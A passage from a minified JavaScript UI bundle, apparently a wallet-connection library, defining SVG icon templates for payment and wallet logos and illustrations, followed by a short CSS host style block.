        d="M.5 16.6c0-3.093 0-5.38.162-7.182.161-1.795.48-3.061 1.086-4.125a9.5 9.5 0 0 1 3.545-3.545C6.357 1.141 7.623.823 9.418.662 11.221.5 13.508.5 16.6.5h6.8c3.093 0 5.38 0 7.182.162 1.795.161 3.062.48 4.125 1.086a9.5 9.5 0 0 1 3.545 3.545c.607 1.064.925 2.33 1.086 4.125.161 1.803.162 4.09.162 7.182v6.8c0 3.093 0 5.38-.162 7.182-.161 1.795-.48 3.062-1.086 4.125a9.5 9.5 0 0 1-3.545 3.545c-1.063.607-2.33.925-4.125 1.086-1.803.161-4.09.162-7.182.162h-6.8c-3.093 0-5.38 0-7.182-.162-1.795-.161-3.061-.48-4.125-1.086a9.5 9.5 0 0 1-3.545-3.545c-.607-1.063-.925-2.33-1.086-4.125C.5 28.779.5 26.492.5 23.4v-6.8Z"
        stroke="#fff"
        stroke-opacity=".05"
      />
      <path
        d="M28.306 15.381a3.69 3.69 0 1 0 0-7.381 3.69 3.69 0 0 0 0 7.381ZM16.987 32a8.991 8.991 0 1 1 .016-17.983A8.991 8.991 0 0 1 16.988 32Z"
        fill="#fff"
      />
    </g>
    <defs>
      <clipPath id="a"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    </defs>
  </svg>
`,t$e=xe`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#00ACE6" rx="30" />
    <circle cx="64" cy="39" r="50" fill="#1AC6FF" stroke="#fff" stroke-width="2" />
    <circle cx="78" cy="30" r="50" fill="#4DD2FF" stroke="#fff" stroke-width="2" />
    <circle cx="72" cy="15" r="35" fill="#80DFFF" stroke="#fff" stroke-width="2" />
    <circle cx="34" cy="-17" r="45" stroke="#fff" stroke-width="2" />
    <circle cx="34" cy="-5" r="50" stroke="#fff" stroke-width="2" />
    <circle cx="30" cy="45" r="4" fill="#4DD2FF" stroke="#fff" stroke-width="2" />
    <circle cx="39.5" cy="27.5" r="4" fill="#80DFFF" stroke="#fff" stroke-width="2" />
    <circle cx="16" cy="24" r="4" fill="#19C6FF" stroke="#fff" stroke-width="2" />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#062B2B" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg>`,r$e=xe`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#C653C6" rx="3" />
    <path
      fill="#E87DE8"
      stroke="#fff"
      stroke-width="2"
      d="M52.1 47.34c0-4.24-1.44-9.55-5.9-12.4a2.86 2.86 0 0 0-1.6-3.89v-.82c0-1.19-.52-2.26-1.35-3a4.74 4.74 0 0 0-2.4-6.26v-5.5a11.31 11.31 0 1 0-22.63 0v2.15a3.34 3.34 0 0 0-1.18 5.05 4.74 4.74 0 0 0-.68 6.44A5.22 5.22 0 0 0 14 35.92c-3.06 4.13-6.1 8.3-6.1 15.64 0 2.67.37 4.86.74 6.39a20.3 20.3 0 0 0 .73 2.39l.02.04v.01l.92-.39-.92.4.26.6h38.26l.3-.49-.87-.51.86.5.02-.01.03-.07a16.32 16.32 0 0 0 .57-1.05c.36-.72.85-1.74 1.33-2.96a25.51 25.51 0 0 0 1.94-9.07Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M26.5 29.5c-3-.5-5.5-3-5.5-7v-7c0-.47 0-.7.03-.9a3 3 0 0 1 2.58-2.57c.2-.03.42-.03.89-.03 2 0 2.5-2.5 2.5-2.5s0 2.5 2.5 2.5c1.4 0 2.1 0 2.65.23a3 3 0 0 1 1.62 1.62c.23.55.23 1.25.23 2.65v6c0 4-3 7-6.5 7 1.35.23 4 0 6.5-2v9.53C34 38.5 31.5 40 28 40s-6-1.5-6-2.97L24 34l2.5 1.5v-6ZM26 47h4.5c2.5 0 3 4 3 5.5h-3l-1-1.5H26v-4Zm-6.25 5.5H24V57h-8c0-1 1-4.5 3.75-4.5Z"
      clip-rule="evenodd"
    />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="3" /></clipPath>
  </defs>
</svg> `,i$e=xe`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#794CFF" rx="3" />
  <path
    fill="#987DE8"
    stroke="#fff"
    stroke-width="2"
    d="M33 22.5v-1H16v5H8.5V36H13v-5h3v7.5h17V31h1v7.5h17v-17H34v5h-1v-4Z"
  />
  <path fill="#fff" d="M37.5 25h10v10h-10z" />
  <path fill="#4019B2" d="M42.5 25h5v10h-5z" />
  <path fill="#fff" d="M19.5 25h10v10h-10z" />
  <path fill="#4019B2" d="M24.5 25h5v10h-5z" />
  <path fill="#fff" d="M12 30.5h4V37h-4v-6.5Z" />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,n$e=xe`<svg width="60" height="60" viewBox="0 0 60 60" fill="none">
<g clip-path="url(#clip0_13859_31161)">
  <path d="M0 24.8995C0 15.6481 0 11.0223 1.97053 7.56763C3.3015 5.2342 5.23468 3.30101 7.56812 1.97004C11.0228 -0.000488281 15.6485 -0.000488281 24.9 -0.000488281H35.1C44.3514 -0.000488281 48.9772 -0.000488281 52.4319 1.97004C54.7653 3.30101 56.6985 5.2342 58.0295 7.56763C60 11.0223 60 15.6481 60 24.8995V35.0995C60 44.351 60 48.9767 58.0295 52.4314C56.6985 54.7648 54.7653 56.698 52.4319 58.029C48.9772 59.9995 44.3514 59.9995 35.1 59.9995H24.9C15.6485 59.9995 11.0228 59.9995 7.56812 58.029C5.23468 56.698 3.3015 54.7648 1.97053 52.4314C0 48.9767 0 44.351 0 35.0995V24.8995Z" fill="#EB8B47"/>
  <path d="M0.5 24.8995C0.5 20.2647 0.50047 16.8216 0.744315 14.1045C0.987552 11.3941 1.46987 9.45455 2.40484 7.81536C3.69145 5.55971 5.56019 3.69096 7.81585 2.40435C9.45504 1.46938 11.3946 0.987064 14.105 0.743826C16.8221 0.499981 20.2652 0.499512 24.9 0.499512H35.1C39.7348 0.499512 43.1779 0.499981 45.895 0.743826C48.6054 0.987064 50.545 1.46938 52.1841 2.40435C54.4398 3.69096 56.3086 5.55971 57.5952 7.81536C58.5301 9.45455 59.0124 11.3941 59.2557 14.1045C59.4995 16.8216 59.5 20.2647 59.5 24.8995V35.0995C59.5 39.7343 59.4995 43.1774 59.2557 45.8945C59.0124 48.6049 58.5301 50.5445 57.5952 52.1837C56.3086 54.4393 54.4398 56.3081 52.1841 57.5947C50.545 58.5296 48.6054 59.012 45.895 59.2552C43.1779 59.499 39.7348 59.4995 35.1 59.4995H24.9C20.2652 59.4995 16.8221 59.499 14.105 59.2552C11.3946 59.012 9.45504 58.5296 7.81585 57.5947C5.56019 56.3081 3.69145 54.4393 2.40484 52.1837C1.46987 50.5445 0.987552 48.6049 0.744315 45.8945C0.50047 43.1774 0.5 39.7343 0.5 35.0995V24.8995Z" stroke="#141414" stroke-opacity="0.1"/>
  <path d="M13 26.0335C13 21.7838 13 19.659 14.0822 18.1694C14.4318 17.6883 14.8548 17.2653 15.3359 16.9157C16.8255 15.8335 18.9503 15.8335 23.2 15.8335H36.8C41.0497 15.8335 43.1745 15.8335 44.6641 16.9157C45.1452 17.2653 45.5682 17.6883 45.9178 18.1694C47 19.659 47 21.7838 47 26.0335V33.9668C47 38.2165 47 40.3414 45.9178 41.831C45.5682 42.312 45.1452 42.7351 44.6641 43.0846C43.1745 44.1668 41.0497 44.1668 36.8 44.1668H23.2C18.9503 44.1668 16.8255 44.1668 15.3359 43.0846C14.8548 42.7351 14.4318 42.312 14.0822 41.831C13 40.3414 13 38.2165 13 33.9668V26.0335Z" fill="#FF974C" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
  <path d="M39.5 36.667H36.6666" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
  <path d="M45.2 23.0645H14.8C14.0501 23.0645 13.6751 23.0645 13.4122 23.2554C13.3273 23.3171 13.2527 23.3918 13.191 23.4767C13 23.7395 13 24.1145 13 24.8645V27.2645C13 28.0144 13 28.3894 13.191 28.6522C13.2527 28.7371 13.3273 28.8118 13.4122 28.8735C13.6751 29.0645 14.0501 29.0645 14.8 29.0645H45.2C45.9499 29.0645 46.3249 29.0645 46.5878 28.8735C46.6727 28.8118 46.7473 28.7371 46.809 28.6522C47 28.3894 47 28.0144 47 27.2645V24.8645C47 24.1145 47 23.7395 46.809 23.4767C46.7473 23.3918 46.6727 23.3171 46.5878 23.2554C46.3249 23.0645 45.9499 23.0645 45.2 23.0645Z" fill="white" fill-opacity="0.4" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<defs>
  <clipPath id="clip0_13859_31161">
    <rect width="60" height="60" fill="white"/>
  </clipPath>
</defs>
</svg>`,s$e=xe`
  <svg width="40" height="40" fill="none" xmlns="http://www.w3.org/2000/svg">
    <g clip-path="url(#a)">
      <path
        d="M0 16.6c0-6.168 0-9.251 1.314-11.555a10 10 0 0 1 3.731-3.731C7.35 0 10.432 0 16.6 0h6.8c6.168 0 9.252 0 11.555 1.314a10 10 0 0 1 3.731 3.731C40 7.35 40 10.432 40 16.6v6.8c0 6.168 0 9.252-1.314 11.555a10 10 0 0 1-3.731 3.731C32.652 40 29.568 40 23.4 40h-6.8c-6.168 0-9.251 0-11.555-1.314a10 10 0 0 1-3.731-3.731C0 32.652 0 29.568 0 23.4v-6.8Z"
        fill="#fff"
      />
      <path
        d="M.5 16.6c0-3.093 0-5.38.162-7.182.161-1.795.48-3.061 1.086-4.125a9.5 9.5 0 0 1 3.545-3.545C6.357 1.141 7.623.823 9.418.662 11.221.5 13.508.5 16.6.5h6.8c3.093 0 5.38 0 7.182.162 1.795.161 3.062.48 4.125 1.086a9.5 9.5 0 0 1 3.545 3.545c.607 1.064.925 2.33 1.086 4.125.161 1.803.162 4.09.162 7.182v6.8c0 3.093 0 5.38-.162 7.182-.161 1.795-.48 3.062-1.086 4.125a9.5 9.5 0 0 1-3.545 3.545c-1.063.607-2.33.925-4.125 1.086-1.803.161-4.09.162-7.182.162h-6.8c-3.093 0-5.38 0-7.182-.162-1.795-.161-3.061-.48-4.125-1.086a9.5 9.5 0 0 1-3.545-3.545c-.607-1.063-.925-2.33-1.086-4.125C.5 28.779.5 26.492.5 23.4v-6.8Z"
        stroke="#fff"
        stroke-opacity=".05"
      />
      <path
        d="M18.606 12.642a.781.781 0 0 0-.771.66l-1.281 8.125a.78.78 0 0 1 .77-.66h3.755a7.668 7.668 0 0 0 7.57-6.49 6.26 6.26 0 0 0 .075-.843c-.96-.504-2.089-.792-3.325-.792h-6.793Z"
        fill="#001C64"
      />
      <path
        d="M28.724 13.434c-.006.282-.03.564-.075.843a7.668 7.668 0 0 1-7.57 6.491h-3.754a.78.78 0 0 0-.771.66l-1.916 12.15a.634.634 0 0 0 .626.734h4.075a.781.781 0 0 0 .77-.66l1.074-6.807a.781.781 0 0 1 .772-.66h2.4a7.668 7.668 0 0 0 7.57-6.491c.415-2.651-.92-5.064-3.201-6.26Z"
        fill="#0070E0"
      />
      <path
        d="M13.977 7.226a.78.78 0 0 0-.771.658l-3.198 20.277a.634.634 0 0 0 .626.733h4.742l1.178-7.467 1.281-8.125a.782.782 0 0 1 .771-.66H25.4c1.237 0 2.364.289 3.325.792.065-3.4-2.74-6.208-6.599-6.208h-8.148Z"
        fill="#003087"
      />
    </g>
    <defs>
      <clipPath id="a"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    </defs>
  </svg>
`,o$e=xe`<svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
  <g clip-path="url(#clip0_241_31635)">
    <path d="M0 26.5595C0 16.6913 0 11.7572 2.1019 8.07217C3.5216 5.58317 5.58366 3.52111 8.07266 2.10141C11.7577 -0.000488281 16.6918 -0.000488281 26.56 -0.000488281H37.44C47.3082 -0.000488281 52.2423 -0.000488281 55.9273 2.10141C58.4163 3.52111 60.4784 5.58317 61.8981 8.07217C64 11.7572 64 16.6913 64 26.5595V37.4395C64 47.3077 64 52.2418 61.8981 55.9268C60.4784 58.4158 58.4163 60.4779 55.9273 61.8976C52.2423 63.9995 47.3082 63.9995 37.44 63.9995H26.56C16.6918 63.9995 11.7577 63.9995 8.07266 61.8976C5.58366 60.4779 3.5216 58.4158 2.1019 55.9268C0 52.2418 0 47.3077 0 37.4395V26.5595Z" fill="#EB8B47"/>
    <path d="M0.5 26.5595C0.5 21.6163 0.50047 17.942 0.760736 15.0418C1.02039 12.1485 1.53555 10.0742 2.53621 8.3199C3.91155 5.90869 5.90917 3.91106 8.32039 2.53572C10.0747 1.53506 12.1489 1.01991 15.0423 0.760247C17.9425 0.499981 21.6168 0.499512 26.56 0.499512H37.44C42.3832 0.499512 46.0575 0.499981 48.9577 0.760247C51.8511 1.01991 53.9253 1.53506 55.6796 2.53572C58.0908 3.91106 60.0885 5.90869 61.4638 8.3199C62.4645 10.0742 62.9796 12.1485 63.2393 15.0418C63.4995 17.942 63.5 21.6163 63.5 26.5595V37.4395C63.5 42.3827 63.4995 46.057 63.2393 48.9572C62.9796 51.8506 62.4645 53.9248 61.4638 55.6791C60.0885 58.0903 58.0908 60.088 55.6796 61.4633C53.9253 62.464 51.8511 62.9791 48.9577 63.2388C46.0575 63.499 42.3832 63.4995 37.44 63.4995H26.56C21.6168 63.4995 17.9425 63.499 15.0423 63.2388C12.1489 62.9791 10.0747 62.464 8.32039 61.4633C5.90917 60.088 3.91155 58.0903 2.53621 55.6791C1.53555 53.9248 1.02039 51.8506 0.760736 48.9572C0.50047 46.057 0.5 42.3827 0.5 37.4395V26.5595Z" stroke="#141414" stroke-opacity="0.1"/>
    <path d="M28.1042 49.2329L13.1024 51.2077L15.0772 36.2059L37.1015 14.1815C39.2441 12.039 40.3154 10.9677 41.5718 10.624C42.4205 10.3918 43.3159 10.3918 44.1645 10.624C45.421 10.9677 46.4922 12.039 48.6348 14.1815L50.1286 15.6753C52.2711 17.8179 53.3424 18.8891 53.6861 20.1456C53.9183 20.9942 53.9183 21.8896 53.6861 22.7383C53.3424 23.9947 52.2711 25.066 50.1286 27.2086L28.1042 49.2329Z" fill="#FF974C" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M38.5962 20.5376L22.4199 36.7139" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M43.7727 25.714L27.5964 41.8903" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M22.3703 36.7635C19.3258 39.808 16.0198 36.6395 16.2616 35.0324" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M27.5466 41.9399C24.5034 44.9831 28.155 48.7098 29.2738 48.0475" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M27.5468 41.9398C23.428 46.0586 18.2516 40.8822 22.3704 36.7634" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M15.8191 50.5214C15.4711 49.5823 14.728 48.8392 13.7889 48.4912" stroke="#E4E7E7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M49.2862 29.5805L34.7275 15.0219" stroke="#E4E7E7" stroke-width="2" stroke-linejoin="round"/>
  </g>
  <defs>
    <clipPath id="clip0_241_31635">
      <rect width="64" height="64" fill="white"/>
    </clipPath>
  </defs>
</svg>
`,a$e=xe`<svg
  viewBox="0 0 60 60"
  fill="none"
>
  <g clip-path="url(#1)">
    <rect width="60" height="60" rx="30" fill="#00ACE6" />
    <path
      d="M59 73C59 89.0163 46.0163 102 30 102C13.9837 102 1 89.0163 1 73C1 56.9837 12 44 30 44C48 44 59 56.9837 59 73Z"
      fill="#1AC6FF"
      stroke="white"
      stroke-width="2"
    />
    <path
      d="M18.6904 19.9015C19.6264 15.3286 23.3466 11.8445 27.9708 11.2096C29.3231 11.024 30.6751 11.0238 32.0289 11.2096C36.6532 11.8445 40.3733 15.3286 41.3094 19.9015C41.4868 20.7681 41.6309 21.6509 41.7492 22.5271C41.8811 23.5041 41.8811 24.4944 41.7492 25.4715C41.6309 26.3476 41.4868 27.2304 41.3094 28.097C40.3733 32.6699 36.6532 36.154 32.0289 36.7889C30.6772 36.9744 29.3216 36.9743 27.9708 36.7889C23.3466 36.154 19.6264 32.6699 18.6904 28.097C18.513 27.2304 18.3689 26.3476 18.2506 25.4715C18.1186 24.4944 18.1186 23.5041 18.2506 22.5271C18.3689 21.6509 18.513 20.7681 18.6904 19.9015Z"
      fill="#1AC6FF"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="24.5" cy="23.5" r="1.5" fill="white" />
    <circle cx="35.5" cy="23.5" r="1.5" fill="white" />
    <path
      d="M31 20L28 28H32"
      stroke="white"
      stroke-width="2"
      stroke-linecap="round"
      stroke-linejoin="round"
    />
  </g>
  <rect x="0.5" y="0.5" width="59" height="59" rx="29.5" stroke="white" stroke-opacity="0.1" />
  <defs>
    <clipPath id="1">
      <rect width="60" height="60" rx="30" fill="white" />
    </clipPath>
  </defs>
</svg> `,c$e=xe`<svg fill="none" viewBox="0 0 80 80">
  <g clip-path="url(#a)">
    <path fill="url(#b)" d="M40 80a40 40 0 1 0 0-80 40 40 0 0 0 0 80Z" />
    <path
      stroke="#fff"
      stroke-opacity=".1"
      d="M79.5 40a39.5 39.5 0 1 1-79 0 39.5 39.5 0 0 1 79 0Z"
    />
    <path
      fill="#fff"
      d="m62.62 51.54-7.54 7.91a1.75 1.75 0 0 1-1.29.55H18.02a.9.9 0 0 1-.8-.52.84.84 0 0 1 .16-.92l7.55-7.92a1.75 1.75 0 0 1 1.28-.55h35.77a.87.87 0 0 1 .8.52.84.84 0 0 1-.16.93Zm-7.54-15.95a1.75 1.75 0 0 0-1.29-.54H18.02a.89.89 0 0 0-.8.51.84.84 0 0 0 .16.93l7.55 7.92a1.75 1.75 0 0 0 1.28.54h35.77a.89.89 0 0 0 .8-.51.84.84 0 0 0-.16-.93l-7.54-7.92ZM18.02 29.9h35.77a1.79 1.79 0 0 0 1.29-.54l7.54-7.92a.85.85 0 0 0 .16-.93.87.87 0 0 0-.8-.51H26.21a1.79 1.79 0 0 0-1.28.54l-7.55 7.92a.85.85 0 0 0-.16.93.89.89 0 0 0 .8.52Z"
    />
  </g>
  <defs>
    <linearGradient id="b" x1="6.75" x2="80.68" y1="81.91" y2="7.37" gradientUnits="userSpaceOnUse">
      <stop offset=".08" stop-color="#9945FF" />
      <stop offset=".3" stop-color="#8752F3" />
      <stop offset=".5" stop-color="#5497D5" />
      <stop offset=".6" stop-color="#43B4CA" />
      <stop offset=".72" stop-color="#28E0B9" />
      <stop offset=".97" stop-color="#19FB9B" />
    </linearGradient>
    <clipPath id="a"><path fill="#fff" d="M0 0h80v80H0z" /></clipPath>
  </defs>
</svg> `,l$e=xe`
  <svg width="40" height="40" fill="none" xmlns="http://www.w3.org/2000/svg">
    <g clip-path="url(#a)">
      <path
        d="M0 16.6c0-6.168 0-9.251 1.314-11.555a10 10 0 0 1 3.731-3.731C7.35 0 10.432 0 16.6 0h6.8c6.168 0 9.252 0 11.555 1.314a10 10 0 0 1 3.731 3.731C40 7.35 40 10.432 40 16.6v6.8c0 6.168 0 9.252-1.314 11.555a10 10 0 0 1-3.731 3.731C32.652 40 29.568 40 23.4 40h-6.8c-6.168 0-9.251 0-11.555-1.314a10 10 0 0 1-3.731-3.731C0 32.652 0 29.568 0 23.4v-6.8Z"
        fill="#635BFF"
      />
      <path
        d="M.5 16.6c0-3.093 0-5.38.162-7.182.161-1.795.48-3.061 1.086-4.125a9.5 9.5 0 0 1 3.545-3.545C6.357 1.141 7.623.823 9.418.662 11.221.5 13.508.5 16.6.5h6.8c3.093 0 5.38 0 7.182.162 1.795.161 3.062.48 4.125 1.086a9.5 9.5 0 0 1 3.545 3.545c.607 1.064.925 2.33 1.086 4.125.161 1.803.162 4.09.162 7.182v6.8c0 3.093 0 5.38-.162 7.182-.161 1.795-.48 3.062-1.086 4.125a9.5 9.5 0 0 1-3.545 3.545c-1.063.607-2.33.925-4.125 1.086-1.803.161-4.09.162-7.182.162h-6.8c-3.093 0-5.38 0-7.182-.162-1.795-.161-3.061-.48-4.125-1.086a9.5 9.5 0 0 1-3.545-3.545c-.607-1.063-.925-2.33-1.086-4.125C.5 28.779.5 26.492.5 23.4v-6.8Z"
        stroke="#fff"
        stroke-opacity=".05"
      />
      <path
        fill-rule="evenodd"
        clip-rule="evenodd"
        d="M18.299 15.147c0-1.028.844-1.424 2.242-1.424 2.004 0 4.536.607 6.54 1.688V9.213C24.892 8.343 22.73 8 20.541 8c-5.354 0-8.915 2.796-8.915 7.464 0 7.279 10.022 6.118 10.022 9.257 0 1.213-1.055 1.609-2.531 1.609-2.19 0-4.985-.897-7.2-2.11v6.277a18.283 18.283 0 0 0 7.2 1.503c5.485 0 9.257-2.716 9.257-7.437-.027-7.86-10.075-6.462-10.075-9.416Z"
        fill="#fff"
      />
    </g>
    <defs>
      <clipPath id="a"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    </defs>
  </svg>
`,u$e=xe`<svg viewBox="0 0 60 60" fill="none">
  <g clip-path="url(#1)">
    <path
      d="M0 24.9C0 15.6485 0 11.0228 1.97053 7.56812C3.3015 5.23468 5.23468 3.3015 7.56812 1.97053C11.0228 0 15.6485 0 24.9 0H35.1C44.3514 0 48.9772 0 52.4319 1.97053C54.7653 3.3015 56.6985 5.23468 58.0295 7.56812C60 11.0228 60 15.6485 60 24.9V35.1C60 44.3514 60 48.9772 58.0295 52.4319C56.6985 54.7653 54.7653 56.6985 52.4319 58.0295C48.9772 60 44.3514 60 35.1 60H24.9C15.6485 60 11.0228 60 7.56812 58.0295C5.23468 56.6985 3.3015 54.7653 1.97053 52.4319C0 48.9772 0 44.3514 0 35.1V24.9Z"
      fill="#794CFF"
    />
    <path
      d="M0.5 24.9C0.5 20.2652 0.50047 16.8221 0.744315 14.105C0.987552 11.3946 1.46987 9.45504 2.40484 7.81585C3.69145 5.56019 5.56019 3.69145 7.81585 2.40484C9.45504 1.46987 11.3946 0.987552 14.105 0.744315C16.8221 0.50047 20.2652 0.5 24.9 0.5H35.1C39.7348 0.5 43.1779 0.50047 45.895 0.744315C48.6054 0.987552 50.545 1.46987 52.1841 2.40484C54.4398 3.69145 56.3086 5.56019 57.5952 7.81585C58.5301 9.45504 59.0124 11.3946 59.2557 14.105C59.4995 16.8221 59.5 20.2652 59.5 24.9V35.1C59.5 39.7348 59.4995 43.1779 59.2557 45.895C59.0124 48.6054 58.5301 50.545 57.5952 52.1841C56.3086 54.4398 54.4398 56.3086 52.1841 57.5952C50.545 58.5301 48.6054 59.0124 45.895 59.2557C43.1779 59.4995 39.7348 59.5 35.1 59.5H24.9C20.2652 59.5 16.8221 59.4995 14.105 59.2557C11.3946 59.0124 9.45504 58.5301 7.81585 57.5952C5.56019 56.3086 3.69145 54.4398 2.40484 52.1841C1.46987 50.545 0.987552 48.6054 0.744315 45.895C0.50047 43.1779 0.5 39.7348 0.5 35.1V24.9Z"
      stroke="#062B2B"
      stroke-opacity="0.1"
    />
    <path
      d="M35.1403 31.5016C35.1193 30.9637 35.388 30.4558 35.8446 30.1707C36.1207 29.9982 36.4761 29.8473 36.7921 29.7685C37.3143 29.6382 37.8664 29.7977 38.2386 30.1864C38.8507 30.8257 39.3004 31.6836 39.8033 32.408C40.2796 33.0942 41.4695 33.2512 41.9687 32.5047C42.4839 31.7341 42.9405 30.8229 43.572 30.1399C43.9375 29.7447 44.4866 29.5756 45.0111 29.6967C45.3283 29.7701 45.6863 29.9147 45.9655 30.0823C46.4269 30.3595 46.7045 30.8626 46.6928 31.4008C46.6731 32.3083 46.3764 33.2571 46.2158 34.1473C46.061 35.0048 46.9045 35.8337 47.7592 35.664C48.6464 35.4878 49.5899 35.1747 50.497 35.1391C51.0348 35.1181 51.5427 35.3868 51.8279 35.8433C52.0004 36.1195 52.1513 36.4749 52.2301 36.7908C52.3604 37.3131 52.2009 37.8651 51.8121 38.2374C51.1729 38.8495 50.3151 39.2991 49.5908 39.8019C48.9046 40.2782 48.7473 41.4683 49.4939 41.9675C50.2644 42.4827 51.1757 42.9393 51.8587 43.5708C52.2539 43.9362 52.423 44.4854 52.3018 45.0099C52.2285 45.3271 52.0839 45.6851 51.9162 45.9642C51.6391 46.4257 51.1359 46.7032 50.5978 46.6916C49.6903 46.6719 48.7417 46.3753 47.8516 46.2146C46.9939 46.0598 46.1648 46.9035 46.3346 47.7583C46.5108 48.6454 46.8239 49.5888 46.8594 50.4958C46.8805 51.0336 46.6117 51.5415 46.1552 51.8267C45.879 51.9992 45.5236 52.15 45.2077 52.2289C44.6854 52.3592 44.1334 52.1997 43.7611 51.8109C43.1491 51.1718 42.6996 50.314 42.1968 49.5897C41.7203 48.9034 40.5301 48.7463 40.0309 49.493C39.5157 50.2634 39.0592 51.1746 38.4278 51.8574C38.0623 52.2527 37.5132 52.4218 36.9887 52.3006C36.6715 52.2273 36.3135 52.0826 36.0343 51.915C35.5729 51.6379 35.2953 51.1347 35.307 50.5966C35.3267 49.6891 35.6233 48.7405 35.7839 47.8505C35.9388 46.9928 35.0951 46.1636 34.2402 46.3334C33.3531 46.5096 32.4098 46.8227 31.5028 46.8582C30.9649 46.8793 30.457 46.6105 30.1719 46.154C29.9994 45.8778 29.8485 45.5224 29.7697 45.2065C29.6394 44.6842 29.7989 44.1322 30.1877 43.7599C30.8269 43.1479 31.6847 42.6982 32.4091 42.1954C33.0954 41.7189 33.2522 40.5289 32.5056 40.0297C31.7351 39.5145 30.824 39.058 30.1411 38.4265C29.7459 38.0611 29.5768 37.5119 29.698 36.9875C29.7713 36.6702 29.9159 36.3122 30.0836 36.0331C30.3607 35.5717 30.8638 35.2941 31.402 35.3058C32.3095 35.3255 33.2583 35.6221 34.1485 35.7828C35.006 35.9376 35.8349 35.094 35.6652 34.2393C35.489 33.3521 35.1759 32.4087 35.1403 31.5016Z"
      fill="#906EF7"
      stroke="white"
      stroke-width="2"
    />
    <path
      d="M20.7706 8.22357C20.9036 7.51411 21.5231 7 22.2449 7H23.7551C24.4769 7 25.0964 7.51411 25.2294 8.22357C25.5051 9.69403 25.4829 11.6321 27.1202 12.2606C27.3092 12.3331 27.4958 12.4105 27.6798 12.4926C29.2818 13.2072 30.6374 11.8199 31.8721 10.9752C32.4678 10.5676 33.2694 10.6421 33.7798 11.1525L34.8477 12.2204C35.3581 12.7308 35.4326 13.5323 35.025 14.128C34.1802 15.3627 32.7931 16.7183 33.5077 18.3202C33.5898 18.5043 33.6672 18.6909 33.7398 18.88C34.3683 20.5171 36.3061 20.4949 37.7764 20.7706C38.4859 20.9036 39 21.5231 39 22.2449V23.7551C39 24.4769 38.4859 25.0964 37.7764 25.2294C36.3061 25.5051 34.3685 25.483 33.7401 27.1201C33.6675 27.3093 33.59 27.4961 33.5079 27.6803C32.7934 29.282 34.1803 30.6374 35.025 31.8719C35.4326 32.4677 35.3581 33.2692 34.8477 33.7796L33.7798 34.8475C33.2694 35.3579 32.4678 35.4324 31.8721 35.0248C30.6376 34.1801 29.2823 32.7934 27.6806 33.508C27.4962 33.5903 27.3093 33.6678 27.12 33.7405C25.483 34.3688 25.5051 36.3062 25.2294 37.7764C25.0964 38.4859 24.4769 39 23.7551 39H22.2449C21.5231 39 20.9036 38.4859 20.7706 37.7764C20.4949 36.3062 20.517 34.3688 18.88 33.7405C18.6908 33.6678 18.5039 33.5903 18.3196 33.5081C16.7179 32.7936 15.3625 34.1804 14.1279 35.0251C13.5322 35.4327 12.7307 35.3582 12.2203 34.8478L11.1524 33.7799C10.642 33.2695 10.5675 32.4679 10.9751 31.8722C11.8198 30.6376 13.2067 29.2822 12.4922 27.6804C12.41 27.4962 12.3325 27.3093 12.2599 27.1201C11.6315 25.483 9.69392 25.5051 8.22357 25.2294C7.51411 25.0964 7 24.4769 7 23.7551V22.2449C7 21.5231 7.51411 20.9036 8.22357 20.7706C9.69394 20.4949 11.6317 20.5171 12.2602 18.88C12.3328 18.6909 12.4103 18.5042 12.4924 18.3201C13.207 16.7181 11.8198 15.3625 10.975 14.1278C10.5674 13.5321 10.6419 12.7305 11.1523 12.2201L12.2202 11.1522C12.7306 10.6418 13.5322 10.5673 14.1279 10.9749C15.3626 11.8197 16.7184 13.2071 18.3204 12.4925C18.5044 12.4105 18.6909 12.3331 18.8799 12.2606C20.5171 11.6321 20.4949 9.69403 20.7706 8.22357Z"
      fill="#906EF7"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="23" cy="23" r="6" fill="#794CFF" stroke="white" stroke-width="2" />
    <circle cx="41" cy="41" r="4" fill="#794CFF" stroke="white" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="1">
      <rect width="60" height="60" fill="white" />
    </clipPath>
  </defs>
</svg> `,d$e=ge`
  :host {
    display: block;
    width: var(--local-size);
    height: var(--local-size);
  }

  :host svg {
    width: 100%;
    height: 100%;
  }
